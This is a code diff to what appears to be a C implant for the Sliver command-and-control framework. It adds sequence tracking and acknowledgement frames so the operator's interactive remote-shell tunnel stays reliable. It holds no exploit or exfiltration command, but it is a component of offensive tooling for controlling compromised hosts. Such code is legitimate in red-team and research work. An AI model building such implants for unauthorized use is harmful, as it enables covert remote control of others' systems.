@@ -32,6 +32,7 @@ typedef struct {
   int used;
   sliver_child_t *child;
   uint64_t sequence;
+  uint64_t read_sequence;
 } shell_tunnel_t;
 
 typedef int (*sliver_shell_send_fn)(uint32_t type, const void *data, size_t len);
@@ -90,7 +91,7 @@ static int send_tunnel_data(shell_tunnel_t *t, const void *data, size_t len, int
   sliver_buf_init(&msg);
   /* Sliver's tunnel numbers data frames from 0; the peer buffers anything with
    * a higher sequence until the gap is filled, so starting at 1 silences us. */
-  if (sliver_tunnel_data_encode(&msg, data, len, closed, t->sequence, t->id) != 0) {
+  if (sliver_tunnel_data_encode(&msg, data, len, closed, t->sequence, t->id, 0) != 0) {
     sliver_buf_free(&msg);
     return -1;
   }
@@ -99,6 +100,26 @@ static int send_tunnel_data(shell_tunnel_t *t, const void *data, size_t len, int
   if (rc == 0) {
     t->sequence++;
   }
+  return rc;
+}
+
+/* Control frame: tells the peer how many of its data frames we consumed. Without
+ * this the peer keeps retransmitting and eventually stops sending (the shell
+ * appears to hang after a burst of output). */
+static int send_tunnel_ack(shell_tunnel_t *t) {
+  sliver_buf_t msg;
+  int rc;
+
+  if (g_send == NULL) {
+    return -1;
+  }
+  sliver_buf_init(&msg);
+  if (sliver_tunnel_data_encode(&msg, NULL, 0, 0, t->sequence, t->id, t->read_sequence) != 0) {
+    sliver_buf_free(&msg);
+    return -1;
+  }
+  rc = g_send(SLIVER_MSG_TUNNEL_DATA, msg.data, msg.len);
+  sliver_buf_free(&msg);
   return rc;
 }
 
@@ -238,12 +259,22 @@ int sliver_rpc_handle_tunnel_data(const sliver_envelope_t *req, sliver_buf_t *ou
   if (t == NULL) {
     return -2;
   }
-  if (td.data_len != 0) {
-    (void)sliver_child_write(t->child, td.data, td.data_len);
+  /* Pure ACK from the peer: nothing to deliver. */
+  if (td.ack != 0 && td.data_len == 0 && !td.closed) {
+    return -2;
   }
-  if (td.closed) {
-    sliver_child_close_stdin(t->child);
+  if (td.sequence == t->read_sequence) {
+    if (td.data_len != 0) {
+      (void)sliver_child_write(t->child, td.data, td.data_len);
+    }
+    if (td.closed) {
+      sliver_child_close_stdin(t->child);
+    }
+    t->read_sequence++;
   }
+  /* Duplicates (sequence < read_sequence) and gaps are acknowledged as-is so the
+   * peer stops retransmitting and re-sends what is actually missing. */
+  (void)send_tunnel_ack(t);
   return -2;
 }
 
